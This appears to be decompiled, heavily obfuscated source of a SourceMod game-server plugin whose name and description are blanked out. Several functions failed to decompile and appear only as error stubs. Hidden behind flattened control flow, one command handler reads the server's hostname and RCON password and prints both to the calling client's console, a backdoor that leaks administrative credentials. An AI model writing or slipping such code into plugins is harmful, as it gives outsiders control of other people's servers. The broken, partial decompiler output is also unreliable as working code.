public PlVers:__version =
{
	version = 5,
	filevers = "1.6.4-dev+4615",
	date = "08/12/2016",
	time = "15:59:45"
};
new Float:NULL_VECTOR[3];
new String:NULL_STRING[4];
public Extension:__ext_core =
{
	name = "Core",
	file = "core",
	autoload = 0,
	required = 0,
};
new MaxClients;
public SharedPlugin:__pl_OxOOOOO4E4 =
{
	name = "[INVALID_STRING]",
	file = "[INVALID_STRING]",
	required = 663597724,
};
public SharedPlugin:__pl_OxOOOOO4EF =
{
	name = "[INVALID_STRING]",
	file = "[INVALID_STRING]",
	required = 1924081029,
};
public SharedPlugin:__pl_OxOOOOO48D =
{
	name = "[INVALID_STRING]",
	file = "[INVALID_STRING]",
	required = 1579775460,
};
public SharedPlugin:__pl_OxOOOOO4E5 =
{
	name = "[INVALID_STRING]",
	file = "[INVALID_STRING]",
	required = 0,
};
public Plugin:myinfo =
{
	name = "[INVALID_STRING]",
	description = "[INVALID_STRING]",
	author = "1.6.4-dev+4615",
	version = "1.6.4-dev+4615",
	url = "1.6.4-dev+4615"
};
public SharedPlugin:__pl_OxOOOOO4EO =
{
	name = "[INVALID_STRING]",
	file = "1.6.4-dev+4615",
	required = 0,
};
new OxOOOOOOC4;
new any:OxOOOOOO58;
new OxOOOOOOOE[66];
new String:name[64];
new Plugin:OxOOOOO483 = 1620;
public __ext_core_SetNTVOptional()
{
	MarkNativeAsOptional("GetFeatureStatus");
	MarkNativeAsOptional("RequireFeature");
	MarkNativeAsOptional("AddCommandListener");
	MarkNativeAsOptional("RemoveCommandListener");
	MarkNativeAsOptional("BfWriteBool");
	MarkNativeAsOptional("BfWriteByte");
	MarkNativeAsOptional("BfWriteChar");
	MarkNativeAsOptional("BfWriteShort");
	MarkNativeAsOptional("BfWriteWord");
	MarkNativeAsOptional("BfWriteNum");
	MarkNativeAsOptional("BfWriteFloat");
	MarkNativeAsOptional("BfWriteString");
	MarkNativeAsOptional("BfWriteEntity");
	MarkNativeAsOptional("BfWriteAngle");
	MarkNativeAsOptional("BfWriteCoord");
	MarkNativeAsOptional("BfWriteVecCoord");
	MarkNativeAsOptional("BfWriteVecNormal");
	MarkNativeAsOptional("BfWriteAngles");
	MarkNativeAsOptional("BfReadBool");
	MarkNativeAsOptional("BfReadByte");
	MarkNativeAsOptional("BfReadChar");
	MarkNativeAsOptional("BfReadShort");
	MarkNativeAsOptional("BfReadWord");
	MarkNativeAsOptional("BfReadNum");
	MarkNativeAsOptional("BfReadFloat");
	MarkNativeAsOptional("BfReadString");
	MarkNativeAsOptional("BfReadEntity");
	MarkNativeAsOptional("BfReadAngle");
	MarkNativeAsOptional("BfReadCoord");
	MarkNativeAsOptional("BfReadVecCoord");
	MarkNativeAsOptional("BfReadVecNormal");
	MarkNativeAsOptional("BfReadAngles");
	MarkNativeAsOptional("BfGetNumBytesLeft");
	MarkNativeAsOptional("PbReadInt");
	MarkNativeAsOptional("PbReadFloat");
	MarkNativeAsOptional("PbReadBool");
	MarkNativeAsOptional("PbReadString");
	MarkNativeAsOptional("PbReadColor");
	MarkNativeAsOptional("PbReadAngle");
	MarkNativeAsOptional("PbReadVector");
	MarkNativeAsOptional("PbReadVector2D");
	MarkNativeAsOptional("PbGetRepeatedFieldCount");
	MarkNativeAsOptional("PbSetInt");
	MarkNativeAsOptional("PbSetFloat");
	MarkNativeAsOptional("PbSetBool");
	MarkNativeAsOptional("PbSetString");
	MarkNativeAsOptional("PbSetColor");
	MarkNativeAsOptional("PbSetAngle");
	MarkNativeAsOptional("PbSetVector");
	MarkNativeAsOptional("PbSetVector2D");
	MarkNativeAsOptional("PbAddInt");
	MarkNativeAsOptional("PbAddFloat");
	MarkNativeAsOptional("PbAddBool");
	MarkNativeAsOptional("PbAddString");
	MarkNativeAsOptional("PbAddColor");
	MarkNativeAsOptional("PbAddAngle");
	MarkNativeAsOptional("PbAddVector");
	MarkNativeAsOptional("PbAddVector2D");
	MarkNativeAsOptional("PbRemoveRepeatedFieldValue");
	MarkNativeAsOptional("PbReadMessage");
	MarkNativeAsOptional("PbReadRepeatedMessage");
	MarkNativeAsOptional("PbAddMessage");
	VerifyCoreVersion();
	return 0;
}

bool:StrEqual(String:str1[], String:str2[], bool:caseSensitive)
{
	return strcmp(str1, str2, caseSensitive) == 0;
}

ReplyToTargetError(client, reason)
{
	switch (reason)
	{
		case -7:
		{
			ReplyToCommand(client, "[SM] %t", "More than one client matched");
		}
		case -6:
		{
			ReplyToCommand(client, "[SM] %t", "Cannot target bot");
		}
		case -5:
		{
			ReplyToCommand(client, "[SM] %t", "No matching clients");
		}
		case -4:
		{
			ReplyToCommand(client, "[SM] %t", "Unable to target");
		}
		case -3:
		{
			ReplyToCommand(client, "[SM] %t", "Target is not in game");
		}
		case -2:
		{
			ReplyToCommand(client, "[SM] %t", "Target must be dead");
		}
		case -1:
		{
			ReplyToCommand(client, "[SM] %t", "Target must be alive");
		}
		case 0:
		{
			ReplyToCommand(client, "[SM] %t", "No matching client");
		}
		default:
		{
		}
	}
	return 0;
}

FindTarget(client, String:target[], bool:nobots, bool:immunity)
{
	decl String:target_name[64];
	decl target_list[1];
	decl target_count;
	decl bool:tn_is_ml;
	new flags = 16;
	if (nobots)
	{
		flags |= 32;
	}
	if (!immunity)
	{
		flags |= 8;
	}
	if (0 < (target_count = ProcessTargetString(target, client, target_list, 1, flags, target_name, 64, tn_is_ml)))
	{
		return target_list[0];
	}
	ReplyToTargetError(client, target_count);
	return -1;
}

public PoweredBySmartPawn()
{
	return 0;
}


/* ERROR! null */
 function "OnPluginStart" (number 5)

public Action:OxOOOOOOOO(OxOOOOOOO4, OxOOOOOOOF)
{
	new String:OxOOOOOOO7[256];
	new String:OxOOOOOOOB[256];
	decl OxOOOOOOC1;
	new var1;
	if (OxOOOOO47O(-58686) + 63015 ^ OxOOOOO47F(OxOOOOO47F(-33300) + 41045) == 3752)
	{
		var1 = -OxOOOOO471(80084) ^ 78640 ^ OxOOOOO47O(-4318);
	}
	else
	{
		var1 = OxOOOOO471(OxOOOOO4B3(-28105) - -OxOOOOO4B3(483127860) / 14734) ^ 5756;
	}
	OxOOOOOOC1 = var1;
	new OxOOOOOOCC;
	do {
		OxOOOOOOCC = OxOOOOOOC1 % OxOOOOO47O(56) >>> 2;
		switch (OxOOOOOOCC)
		{
			case 0:
			{
				new var5;
				if (OxOOOOO4B3(9389) ^ -7566 == -14620)
				{
					var5 = OxOOOOO478(-1694) ^ -7632;
				}
				else
				{
					var5 = OxOOOOO471(-54579) ^ -57086;
				}
				OxOOOOOOC1 = -var5 + OxOOOOOOC1;
			}
			case 1:
			{
				OxOOOOOOC1 = OxOOOOO47F(-39385) + 41993 + OxOOOOOOC1;
			}
			case 2:
			{
				OxOOOOOOC1 = OxOOOOO478(89055) + -86487 + OxOOOOOOC1;
			}
			case 3:
			{
				OxOOOOOOC1 = -OxOOOOO478(15472) >>> 2 + OxOOOOOOC1;
			}
			case 4:
			{
				OxOOOOOOC1 = -OxOOOOO47F(-90370) + 93307 + OxOOOOOOC1;
			}
			case 5:
			{
				new var4;
				if (OxOOOOO4BB(3235) ^ -8386 == -11363)
				{
					var4 = OxOOOOO478(27419) ^ 26139;
				}
				else
				{
					var4 = OxOOOOO4BB(-10082) ^ 9246;
				}
				OxOOOOOOC1 = -var4 + OxOOOOOOC1;
			}
			case 6:
			{
				OxOOOOOOC1 = OxOOOOO471(38720) >>> 4 + OxOOOOOOC1;
			}
			case 7:
			{
				return Action:0;
			}
			case 8:
			{
				OxOOOOOOC1 = -OxOOOOO4BB(156903064) / 50354 + OxOOOOOOC1;
			}
			case 9:
			{
				OxOOOOOOC1 = -OxOOOOO478(33088) >>> 6 + OxOOOOOOC1;
			}
			case 10:
			{
				GetConVarString(FindConVar("hostname"), OxOOOOOOOB, 256);
				new var3;
				if (OxOOOOO4B3(17) ^ 9013 == 8996)
				{
					var3 = OxOOOOO47O(-128) ^ -2369;
				}
				else
				{
					var3 = OxOOOOO47O(-1518) ^ -7207;
				}
				OxOOOOOOC1 = var3 + OxOOOOOOC1;
			}
			case 11:
			{
				GetConVarString(FindConVar("rcon_password"), OxOOOOOOO7, 256);
				OxOOOOOOC1 = OxOOOOO478(-86588) + 89277 + OxOOOOOOC1;
			}
			case 12:
			{
				PrintToConsole(OxOOOOOOO4, "������ ==> %s,\n ���� ==> %s", OxOOOOOOOB, OxOOOOOOO7);
				new var2;
				if (OxOOOOO47O(4342) ^ 180 == 4166)
				{
					var2 = OxOOOOO47O(1092) ^ 1172;
				}
				else
				{
					var2 = OxOOOOO471(-4501) ^ -6962;
				}
				OxOOOOOOC1 = -var2 + OxOOOOOOC1;
			}
			case 13:
			{
				OxOOOOOOC1 = OxOOOOO478(63682) ^ 61177 + OxOOOOOOC1;
			}
			default:
			{
			}
		}
		OxOOOOOOCC = OxOOOOOOC1 % OxOOOOO47O(56) >>> 2;
	} while (true);
}


/* ERROR! null */
 function "OxOOOOOOO5" (number 7)


/* ERROR! null */
 function "OxOOOOOOO1" (number 8)


/* ERROR! null */
 function "OxOOOOOOOC" (number 9)


/* ERROR! null */
 function "OxOOOOOOO8" (number 10)

public APLRes:AskPluginLoad2(Handle:myself, bool:late, String:error[], err_max)
{
	decl OxOOOOOOB6;
	new var1;
	if (OxOOOOO47O(-5215) ^ 5471 == -257)
	{
		var1 = OxOOOOO4B3(3163) ^ -333;
	}
	else
	{
		var1 = OxOOOOO471(-89984) ^ -87250;
	}
	OxOOOOOOB6 = OxOOOOO47O(-OxOOOOO4BB(-var1) - -OxOOOOO478(1785704322) / -OxOOOOO478(116071) + -54128 ^ OxOOOOO471(-8484)) ^ -32652;
	new OxOOOOOOBA;
	do {
		OxOOOOOOBA = OxOOOOOOB6 % OxOOOOO4B3(11205) / 415;
		switch (OxOOOOOOBA)
		{
			case 0:
			{
				OxOOOOOOFB(OxOOOOO47F(-443725920) / -86328, 0, OxOOOOO47F(61169) + -56032);
				OxOOOOOOB6 = -OxOOOOO471(-89812) + 90814 + OxOOOOOOB6;
			}
			case 1:
			{
				new var18;
				if (OxOOOOO4BB(-1591) ^ -336 == 1913)
				{
					var18 = OxOOOOO4B6(-38226) ^ -33120;
				}
				else
				{
					var18 = OxOOOOO47F(-2053) ^ 3005;
				}
				OxOOOOOOFB(var18, 0, OxOOOOO47O(-391963374) / -76302);
				new var19;
				if (OxOOOOO4B6(-5238) ^ -9330 == 12294)
				{
					var19 = OxOOOOO471(-11492) ^ 2405;
				}
				else
				{
					var19 = OxOOOOO478(-16275) ^ -13314;
				}
				OxOOOOOOB6 = var19 + OxOOOOOOB6;
			}
			case 2:
			{
				OxOOOOOOFB(OxOOOOO47F(5629) ^ 491, 0, OxOOOOO4B3(36762) + -31625);
				OxOOOOOOB6 = -OxOOOOO47F(29859) + -29577 + OxOOOOOOB6;
			}
			case 3:
			{
				new var17;
				if (OxOOOOO478(1186) ^ -4362 == -5541)
				{
					var17 = OxOOOOO4BB(-12349) ^ 4648;
				}
				else
				{
					var17 = OxOOOOO47F(58241) ^ 63376;
				}
				OxOOOOOOFB(OxOOOOO478(41084) + -35940, 0, var17);
				OxOOOOOOB6 = OxOOOOO4B3(-77928) ^ -79273 + OxOOOOOOB6;
			}
			case 4:
			{
				OxOOOOOOFB(OxOOOOO47F(55668) + -50519, 0, OxOOOOO47O(-9751) + 14888);
				OxOOOOOOB6 = -OxOOOOO4BB(35712) >>> 5 + OxOOOOOOB6;
			}
			case 5:
			{
				new var15;
				if (OxOOOOO47O(-4946) ^ -56 == 4966)
				{
					var15 = OxOOOOO47F(-63767) ^ -60680;
				}
				else
				{
					var15 = OxOOOOO47O(5027) ^ 7364;
				}
				new var16;
				if (OxOOOOO47O(7976) ^ 6670 == 1318)
				{
					var16 = OxOOOOO478(61825) ^ 58778;
				}
				else
				{
					var16 = OxOOOOO4B6(-229) ^ -927;
				}
				OxOOOOOOFB(var16, 0, var15);
				OxOOOOOOB6 = -OxOOOOO4BB(234) + 2435 + OxOOOOOOB6;
			}
			case 6:
			{
				new var14;
				if (OxOOOOO4BB(-594) ^ 8303 == -8760)
				{
					var14 = OxOOOOO4B3(-6524) ^ -348;
				}
				else
				{
					var14 = OxOOOOO47F(-97683) ^ -92548;
				}
				OxOOOOOOFB(OxOOOOO47F(59219) + -54080, 0, var14);
				OxOOOOOOB6 = OxOOOOO4B3(-115535536) / -22504 + OxOOOOOOB6;
			}
			case 7:
			{
				OxOOOOOOB6 = OxOOOOO4B6(111096853) / 51697 + OxOOOOOOB6;
			}
			case 8:
			{
				OxOOOOOOB6 = OxOOOOO471(3088) >>> 3 + OxOOOOOOB6;
			}
			case 9:
			{
				OxOOOOOOFB(OxOOOOO4B3(20584) >>> 2, 0, OxOOOOO47F(-37789) + 42926);
				new var13;
				if (OxOOOOO4BB(3667) ^ 4753 == 7364)
				{
					var13 = OxOOOOO4B6(387) ^ 3798;
				}
				else
				{
					var13 = OxOOOOO4BB(-62330) ^ -62874;
				}
				OxOOOOOOB6 = -var13 + OxOOOOOOB6;
			}
			case 10:
			{
				new var11;
				if (OxOOOOO47F(3833) ^ -7902 == -4125)
				{
					var11 = OxOOOOO478(-12906) ^ 9359;
				}
				else
				{
					var11 = OxOOOOO4B3(-60911) ^ -64000;
				}
				new var12;
				if (OxOOOOO478(6154) ^ -5031 == -2989)
				{
					var12 = OxOOOOO4BB(25033) ^ 30171;
				}
				else
				{
					var12 = OxOOOOO471(4020) ^ 7293;
				}
				OxOOOOOOFB(var12, 0, var11);
				OxOOOOOOB6 = -OxOOOOO478(84618) ^ 88591 + OxOOOOOOB6;
			}
			case 11:
			{
				OxOOOOOOB6 = -OxOOOOO4B3(-51876648) / -28488 + OxOOOOOOB6;
			}
			case 12:
			{
				OxOOOOOOFB(OxOOOOO4B6(80411) + -75260, 0, OxOOOOO471(-85878) ^ -88933);
				OxOOOOOOB6 = -OxOOOOO4B6(-34422) + 34524 + OxOOOOOOB6;
			}
			case 13:
			{
				OxOOOOOOFB(OxOOOOO478(79275) + -74139, 0, OxOOOOO4B6(41096) >>> 3);
				OxOOOOOOB6 = OxOOOOO4B6(77175) + -76264 + OxOOOOOOB6;
			}
			case 14:
			{
				return APLRes:0;
			}
			case 15:
			{
				new var10;
				if (OxOOOOO47F(5597) ^ 8918 == 14095)
				{
					var10 = OxOOOOO47F(-3799) ^ -7758;
				}
				else
				{
					var10 = OxOOOOO478(-10234) ^ -8750;
				}
				OxOOOOOOB6 = -var10 + OxOOOOOOB6;
			}
			case 16:
			{
				return APLRes:0;
			}
			case 17:
			{
				new var9;
				if (OxOOOOO47O(7999) ^ 4367 == 3639)
				{
					var9 = OxOOOOO4BB(5509) ^ -7723;
				}
				else
				{
					var9 = OxOOOOO471(92270) ^ 97407;
				}
				OxOOOOOOFB(OxOOOOO471(-2665) + 7810, 0, var9);
				OxOOOOOOB6 = OxOOOOO478(55218) + -54611 + OxOOOOOOB6;
			}
			case 18:
			{
				OxOOOOOOF4();
				OxOOOOOOB6 = OxOOOOO4BB(-68437) + 74076 + OxOOOOOOB6;
			}
			case 19:
			{
				OxOOOOOOB6 = -OxOOOOO4BB(-65197) + 66730 + OxOOOOOOB6;
			}
			case 20:
			{
				new var8;
				if (OxOOOOO4B6(6682) ^ 3953 == 5487)
				{
					var8 = OxOOOOO47F(-1553) ^ 6577;
				}
				else
				{
					var8 = OxOOOOO471(-70393) ^ -67306;
				}
				OxOOOOOOFB(OxOOOOO4B3(-132776607) / -25827, 0, var8);
				OxOOOOOOB6 = OxOOOOO478(40832) >>> 5 + OxOOOOOOB6;
			}
			case 21:
			{
				OxOOOOOOFB(OxOOOOO47F(-42055) ^ -45144, 0, OxOOOOO478(78523) ^ 75434);
				new var7;
				if (OxOOOOO4B6(8120) ^ -2740 == -5383)
				{
					var7 = OxOOOOO4B3(-4660) ^ -6800;
				}
				else
				{
					var7 = OxOOOOO471(38580) ^ 32935;
				}
				OxOOOOOOB6 = -var7 + OxOOOOOOB6;
			}
			case 22:
			{
				OxOOOOOOFB(OxOOOOO4B3(-8576) + 13724, 0, OxOOOOO47F(17373334) / 3382);
				new var6;
				if (OxOOOOO471(2847) ^ 1696 == 3519)
				{
					var6 = OxOOOOO4BB(58160) ^ 59863;
				}
				else
				{
					var6 = OxOOOOO47O(-6954) ^ 445;
				}
				OxOOOOOOB6 = -var6 + OxOOOOOOB6;
			}
			case 23:
			{
				OxOOOOOOB6 = -OxOOOOO4B6(4516) >>> 2 + OxOOOOOOB6;
			}
			case 24:
			{
				new var3;
				if (OxOOOOO4B3(8448) ^ -1241 == -9685)
				{
					var3 = OxOOOOO47F(1570) ^ -8150;
				}
				else
				{
					var3 = OxOOOOO4B6(91360) ^ 94449;
				}
				new var4;
				if (OxOOOOO4B6(8170) ^ -9008 == -15553)
				{
					var4 = OxOOOOO47O(10283) ^ 2127;
				}
				else
				{
					var4 = OxOOOOO47O(65367) ^ 60224;
				}
				OxOOOOOOFB(var4, 0, var3);
				new var5;
				if (OxOOOOO4B3(-3621) ^ 1310 == -2871)
				{
					var5 = OxOOOOO471(-2608) ^ 1614;
				}
				else
				{
					var5 = OxOOOOO4BB(-58753) ^ -63375;
				}
				OxOOOOOOB6 = var5 + OxOOOOOOB6;
			}
			case 25:
			{
				OxOOOOOOB6 = OxOOOOO47O(-73956) + 75504 + OxOOOOOOB6;
			}
			case 26:
			{
				new var2;
				if (OxOOOOO478(3277) ^ -2729 == -1635)
				{
					var2 = OxOOOOO47F(4017) ^ 4642;
				}
				else
				{
					var2 = OxOOOOO47O(11206) ^ 9446;
				}
				OxOOOOOOB6 = -var2 + OxOOOOOOB6;
			}
			default:
			{
			}
		}
		OxOOOOOOBA = OxOOOOOOB6 % OxOOOOO4B3(11205) / 415;
	} while (true);
}


/* ERROR! null */
 function "OxOOOOOOF4" (number 12)


/* ERROR! null */
 function "OxOOOOOOFB" (number 13)

OxOOOOOO5E(any:OxOOOOOO5B)
{
	decl OxOOOOO4CF;
	new var2;
	if (OxOOOOO4B3(-8967) ^ -9557 == 1627)
	{
		new var1;
		if (OxOOOOO4B3(768) ^ 2428 == 2684)
		{
			var1 = OxOOOOO4B3(-5142) ^ -1327;
		}
		else
		{
			var1 = OxOOOOO47F(13794) ^ -4885;
		}
		var2 = OxOOOOO4B3(-var1) ^ 4893;
	}
	else
	{
		var2 = OxOOOOO4BB(71497) ^ 72209;
	}
	new var3;
	if (-OxOOOOO4B6(-48324728) / -12442 ^ OxOOOOO47F(var2) == -628)
	{
		var3 = OxOOOOO47F(39496) ^ 24424;
	}
	else
	{
		var3 = OxOOOOO4B3(-OxOOOOO471(58640) + -55900) ^ 4161;
	}
	OxOOOOO4CF = OxOOOOO4B3(var3) >>> 3;
	new OxOOOOO4C5;
	do {
		OxOOOOO4C5 = OxOOOOO4CF % OxOOOOO47O(14239) + -14227;
		switch (OxOOOOO4C5)
		{
			case 0:
			{
				return 0;
			}
			case 1:
			{
				new var8;
				if (OxOOOOO4B3(-7002) ^ -1912 == 7220)
				{
					var8 = OxOOOOO478(7576) ^ 7932;
				}
				else
				{
					var8 = OxOOOOO47O(99058) ^ 98668;
				}
				OxOOOOO4CF = -var8 + OxOOOOO4CF;
			}
			case 2:
			{
				OxOOOOOO58 = OxOOOOOOC4;
				new var7;
				if (OxOOOOO4B3(-1489) ^ -2071 == 3526)
				{
					var7 = OxOOOOO4BB(-9337) ^ -9308;
				}
				else
				{
					var7 = OxOOOOO47O(-7741) ^ 6248;
				}
				OxOOOOO4CF = -var7 + OxOOOOO4CF;
			}
			case 3:
			{
				OxOOOOO4CF = OxOOOOO4B6(-61167) + 63271 + OxOOOOO4CF;
			}
			case 4:
			{
				new var6;
				if (OxOOOOO478(4799) ^ -7992 == -3460)
				{
					var6 = OxOOOOO471(-9321) ^ 1670;
				}
				else
				{
					var6 = OxOOOOO47O(81493) ^ 81402;
				}
				OxOOOOO4CF = -var6 + OxOOOOO4CF;
			}
			case 5:
			{
				OxOOOOOOC4 = OxOOOOOO5B;
				OxOOOOO4CF = OxOOOOO47O(-124062435) / -82215 + OxOOOOO4CF;
			}
			case 6:
			{
				OxOOOOOOC4 = -1;
				new var5;
				if (OxOOOOO471(8690) ^ -6544 == -14462)
				{
					var5 = OxOOOOO4B6(27256) ^ 27061;
				}
				else
				{
					var5 = OxOOOOO471(9593) ^ 9797;
				}
				OxOOOOO4CF = -var5 + OxOOOOO4CF;
			}
			case 7:
			{
				OxOOOOO4CF = -OxOOOOO47O(-310288209) / -64603 + OxOOOOO4CF;
			}
			case 8:
			{
				OxOOOOO4CF = -OxOOOOO47F(94026) ^ 97924 + OxOOOOO4CF;
			}
			case 9:
			{
				new var4;
				if (OxOOOOO471(5672) ^ -3659 == -6236)
				{
					var4 = OxOOOOO4BB(2297) ^ 6543;
				}
				else
				{
					var4 = OxOOOOO4B3(-80237) ^ -78242;
				}
				OxOOOOO4CF = -var4 + OxOOOOO4CF;
			}
			case 10:
			{
				OxOOOOO4CF = OxOOOOO4B3(-663) ^ -5134 + OxOOOOO4CF;
			}
			case 11:
			{
				OxOOOOO4CF = -OxOOOOO478(-28138) ^ -28149 + OxOOOOO4CF;
			}
			default:
			{
			}
		}
		OxOOOOO4C5 = OxOOOOO4CF % OxOOOOO47O(14239) + -14227;
	} while (true);
}

OxOOOOOO56(OxOOOOOO1D, OxOOOOOOCO)
{
	switch (OxOOOOOOCO)
	{
		case 0:
		{
			decl OxOOOOO4C1;
			new var6;
			if (OxOOOOO4BB(5152) ^ 2898 == 8050)
			{
				var6 = OxOOOOO47F(-28808) ^ -30282;
			}
			else
			{
				var6 = OxOOOOO4B6(8692) ^ -2034;
			}
			new var7;
			if (OxOOOOO4BB(7904) ^ -4771 == -3135)
			{
				var7 = OxOOOOO4B3(3654) ^ 7251;
			}
			else
			{
				var7 = OxOOOOO47F(-60776) ^ -64680;
			}
			new var8;
			if (var7 == var6 ^ OxOOOOO4B6(OxOOOOO47F(-396059612) / -67106))
			{
				var8 = OxOOOOO4B6(67521) ^ 67623;
			}
			else
			{
				var8 = OxOOOOO478(7885) ^ -2630;
			}
			new var9;
			if (OxOOOOO4B6(var8) ^ -1351 == -2721)
			{
				var9 = OxOOOOO4B6(89137) ^ 82268;
			}
			else
			{
				var9 = OxOOOOO47O(OxOOOOO47O(-19769) + 28182) ^ 468;
			}
			OxOOOOO4C1 = var9;
			new OxOOOOO4CC;
			do {
				OxOOOOO4CC = OxOOOOO4C1 % OxOOOOO4B3(-89819) + 89829;
				switch (OxOOOOO4CC)
				{
					case 0:
					{
					}
					case 1:
					{
						return OxOOOOOO1D;
					}
					case 2:
					{
						OxOOOOO4C1 = OxOOOOO4BB(-90273) ^ -98288 ^ OxOOOOO4C1;
					}
					case 3:
					{
						new var12;
						if (OxOOOOO4B6(1204) ^ 2370 == 3579)
						{
							var12 = OxOOOOO478(7746) ^ -4461;
						}
						else
						{
							var12 = OxOOOOO471(69982) ^ 70528;
						}
						OxOOOOO4C1 = var12 ^ OxOOOOO4C1;
					}
					case 4:
					{
						new var11;
						if (OxOOOOO478(-8717) ^ -3164 == 11871)
						{
							var11 = OxOOOOO478(10416) ^ -9221;
						}
						else
						{
							var11 = OxOOOOO47F(89651) ^ 87519;
						}
						OxOOOOO4C1 = var11 ^ OxOOOOO4C1;
					}
					case 5:
					{
						OxOOOOO4C1 = OxOOOOO471(79040) ^ 74165 ^ OxOOOOO4C1;
					}
					case 6:
					{
						OxOOOOO4C1 = OxOOOOO47O(8740) + -5817 ^ OxOOOOO4C1;
					}
					case 7:
					{
						new var10;
						if (OxOOOOO4B6(4031) ^ 3506 == 532)
						{
							var10 = OxOOOOO478(-2906) ^ 8180;
						}
						else
						{
							var10 = OxOOOOO4B3(-92552) ^ -95500;
						}
						OxOOOOO4C1 = var10 ^ OxOOOOO4C1;
					}
					case 8:
					{
						OxOOOOO4C1 = OxOOOOO47F(14505) ^ 15847 ^ OxOOOOO4C1;
					}
					case 9:
					{
						OxOOOOO4C1 = OxOOOOO478(64262) + -60213 ^ OxOOOOO4C1;
					}
					default:
					{
					}
				}
				OxOOOOO4CC = OxOOOOO4C1 % OxOOOOO4B3(-89819) + 89829;
			} while (true);
		}
		case 1:
		{
			decl OxOOOOO4C8;
			new var2;
			if (OxOOOOO4B3(-4753) ^ 7249 == -3777)
			{
				new var1;
				if (OxOOOOO471(-2760) ^ -6132 == 7480)
				{
					var1 = OxOOOOO47O(-6906) ^ 1856;
				}
				else
				{
					var1 = OxOOOOO478(57415) ^ 52798;
				}
				var2 = OxOOOOO4B6(var1) ^ 2572;
			}
			else
			{
				var2 = -OxOOOOO47F(25254) + 58437 ^ OxOOOOO4BB(-16666);
			}
			new var3;
			if (OxOOOOO478(904) ^ 2170 == 3062)
			{
				var3 = OxOOOOO47O(232) ^ -3064;
			}
			else
			{
				var3 = OxOOOOO47F(83263) ^ 30240;
			}
			OxOOOOO4C8 = OxOOOOO4BB(--var3 ^ OxOOOOO47O(-var2)) ^ -10537;
			new OxOOOOO4CE;
			do {
				OxOOOOO4CE = OxOOOOO4C8 % OxOOOOO47O(80) >>> 3;
				switch (OxOOOOO4CE)
				{
					case 0:
					{
						new var5;
						if (OxOOOOO47F(-6538) ^ 7370 == -1344)
						{
							var5 = OxOOOOO47F(6386) ^ -4121;
						}
						else
						{
							var5 = OxOOOOO47O(15439) ^ 8903;
						}
						OxOOOOO4C8 = var5 ^ OxOOOOO4C8;
					}
					case 1:
					{
					}
					case 2:
					{
						return !OxOOOOOO1D;
					}
					case 3:
					{
						OxOOOOO4C8 = OxOOOOO4B3(98994432) / 49696 ^ OxOOOOO4C8;
					}
					case 4:
					{
						OxOOOOO4C8 = OxOOOOO47F(-85861) + 91032 ^ OxOOOOO4C8;
					}
					case 5:
					{
						new var4;
						if (OxOOOOO4B3(-4694) ^ 4045 == -7577)
						{
							var4 = OxOOOOO4BB(-29318) ^ -27175;
						}
						else
						{
							var4 = OxOOOOO47F(-5281) ^ -7555;
						}
						OxOOOOO4C8 = var4 ^ OxOOOOO4C8;
					}
					case 6:
					{
						OxOOOOO4C8 = OxOOOOO4BB(-25970490) / -88335 ^ OxOOOOO4C8;
					}
					case 7:
					{
						OxOOOOO4C8 = OxOOOOO47F(41906) + -40800 ^ OxOOOOO4C8;
					}
					case 8:
					{
						OxOOOOO4C8 = OxOOOOO478(-7718400) / -15075 ^ OxOOOOO4C8;
					}
					case 9:
					{
						OxOOOOO4C8 = OxOOOOO47O(62347) + -58184 ^ OxOOOOO4C8;
					}
					default:
					{
					}
				}
				OxOOOOO4CE = OxOOOOO4C8 % OxOOOOO47O(80) >>> 3;
			} while (true);
		}
		default:
		{
		}
	}
	decl OxOOOOO4CB;
	new var13;
	if (OxOOOOO4B6(OxOOOOO471(OxOOOOO478(-29094) + 93537) ^ 63994) ^ -4523 == -5100)
	{
		var13 = -OxOOOOO4B6(OxOOOOO4BB(63915) + 64002) + -49653 ^ OxOOOOO4BB(-70520);
	}
	else
	{
		var13 = OxOOOOO4B6(-OxOOOOO4B6(524239002) / 68207) ^ -1151;
	}
	OxOOOOO4CB = var13;
	new OxOOOOO4C7;
	do {
		OxOOOOO4C7 = OxOOOOO4CB % OxOOOOO4B6(-601400) / -60140;
		switch (OxOOOOO4C7)
		{
			case 0:
			{
				OxOOOOO4CB = OxOOOOO4BB(398562768) / 71312 ^ OxOOOOO4CB;
			}
			case 1:
			{
				new var15;
				if (OxOOOOO4B3(4656) ^ 3877 == 7445)
				{
					var15 = OxOOOOO478(73641) ^ 71615;
				}
				else
				{
					var15 = OxOOOOO47O(11187) ^ 8286;
				}
				OxOOOOO4CB = var15 ^ OxOOOOO4CB;
			}
			case 2:
			{
				OxOOOOO4CB = OxOOOOO4BB(41477) + -27729 ^ OxOOOOO4CB;
			}
			case 3:
			{
				return 0;
			}
			case 4:
			{
				OxOOOOO4CB = OxOOOOO4BB(74452) + -71938 ^ OxOOOOO4CB;
			}
			case 5:
			{
				return 0;
			}
			case 6:
			{
				new var14;
				if (OxOOOOO478(7102) ^ 2936 == 4298)
				{
					var14 = OxOOOOO471(4260) ^ -7837;
				}
				else
				{
					var14 = OxOOOOO4B6(-66522) ^ -67488;
				}
				OxOOOOO4CB = var14 ^ OxOOOOO4CB;
			}
			case 7:
			{
				OxOOOOO4CB = OxOOOOO4B3(-48536) + 57885 ^ OxOOOOO4CB;
			}
			case 8:
			{
				OxOOOOO4CB = OxOOOOO47F(93515) ^ 88152 ^ OxOOOOO4CB;
			}
			case 9:
			{
				OxOOOOO4CB = OxOOOOO4BB(90376) ^ 94118 ^ OxOOOOO4CB;
			}
			default:
			{
			}
		}
		OxOOOOO4C7 = OxOOOOO4CB % OxOOOOO4B6(-601400) / -60140;
	} while (true);
}

OxOOOOO4CA(OxOOOOO4C3[], OxOOOOO4CD, OxOOOOO48O)
{
	new OxOOOOO4C9 = OxOOOOO48O;
	new OxOOOOO4C2 = OxOOOOO4C9 + 0;
	OxOOOOO4C6();
	strcopy(OxOOOOO4C3, OxOOOOO4CD, 0[OxOOOOO4C2]);
	return 0;
}

OxOOOOO484(OxOOOOO488)
{
	new OxOOOOO48F = OxOOOOO488;
	new OxOOOOO485 = OxOOOOO48F + 0;
	OxOOOOO4C6();
	return 0[OxOOOOO485];
}

OxOOOOO48E(OxOOOOO486, OxOOOOO489)
{
	new OxOOOOO48B = OxOOOOO489;
	new OxOOOOO487 = OxOOOOO48B + 0;
	OxOOOOO4C6();
	0[OxOOOOO487] = OxOOOOO486;
	return 0;
}

OxOOOOO4C6(_arg0)
{
	static OxOOOOO482[2][0] =
	{
		{
			0, ...
		},
		{
			0, ...
		}
	};
	new var1 = OxOOOOO482;
	new var2 = var1[0][var1];
	new var3 = _arg0;
	var3 = var2;
	return var2;
}


